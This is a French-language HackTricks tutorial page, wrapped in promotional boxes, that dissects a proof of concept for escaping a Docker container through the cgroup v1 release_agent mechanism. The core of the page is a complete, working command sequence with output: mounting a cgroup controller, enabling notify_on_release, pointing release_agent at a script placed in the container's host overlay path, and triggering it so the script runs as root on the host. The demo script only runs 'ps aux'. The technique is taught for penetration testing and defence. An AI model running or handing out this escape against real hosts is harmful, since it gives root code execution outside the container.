# Évasion de Docker via release\_agent cgroups

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### Décortiquer la preuve de concept

Pour déclencher cette exploitation, nous avons besoin d'un cgroup où nous pouvons créer un fichier `release_agent` et déclencher l'invocation de `release_agent` en tuant tous les processus dans le cgroup. La manière la plus simple de réaliser cela est de monter un contrôleur de cgroup et de créer un cgroup enfant.

Pour ce faire, nous créons un répertoire `/tmp/cgrp`, montons le contrôleur de cgroup [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) et créons un cgroup enfant (nommé “x” pour cet exemple). Bien que tous les contrôleurs de cgroup n'aient pas été testés, cette technique devrait fonctionner avec la majorité d'entre eux.

Si vous suivez ces instructions et obtenez **`mount: /tmp/cgrp: special device cgroup does not exist`**, c'est parce que votre configuration n'a pas le contrôleur de cgroup RDMA. **Changez `rdma` par `memory` pour le corriger**. Nous utilisons RDMA parce que le PoC original a été conçu pour fonctionner uniquement avec celui-ci.

Notez que les contrôleurs de cgroup sont des ressources globales qui peuvent être montées plusieurs fois avec différentes permissions et les changements effectués dans un montage s'appliqueront à un autre.

Nous pouvons voir la création du cgroup enfant “x” et le contenu de son répertoire ci-dessous.
```shell-session
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
Ensuite, nous **activons les notifications cgroup** lors de la libération du cgroup “x” en **écrivant un 1** dans son fichier `notify_on_release`. Nous définissons également l'agent de libération cgroup RDMA pour exécuter un script `/cmd` — que nous créerons plus tard dans le conteneur — en écrivant le chemin du script `/cmd` sur l'hôte dans le fichier `release_agent`. Pour ce faire, nous récupérons le chemin du conteneur sur l'hôte à partir du fichier `/etc/mtab`.

Les fichiers que nous ajoutons ou modifions dans le conteneur sont présents sur l'hôte, et il est possible de les modifier des deux côtés : le chemin dans le conteneur et leur chemin sur l'hôte.

Ces opérations peuvent être vues ci-dessous :
```shell-session
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
Notez le chemin vers le script `/cmd` que nous allons créer sur l'hôte :
```shell-session
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
```markdown
Maintenant, nous créons le script `/cmd` de sorte qu'il exécutera la commande `ps aux` et enregistrera sa sortie dans `/output` sur le conteneur en spécifiant le chemin complet du fichier de sortie sur l'hôte. À la fin, nous imprimons également le script `/cmd` pour voir son contenu :
```
```shell-session
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
```markdown
Enfin, nous pouvons exécuter l'attaque en lançant un processus qui se termine immédiatement à l'intérieur du cgroup enfant « x ». En créant un processus `/bin/sh` et en écrivant son PID dans le fichier `cgroup.procs` du répertoire cgroup enfant « x », le script sur l'hôte s'exécutera après la sortie de `/bin/sh`. La sortie de `ps aux` effectuée sur l'hôte est ensuite enregistrée dans le fichier `/output` à l'intérieur du conteneur :
```
```shell-session
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
### Références

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
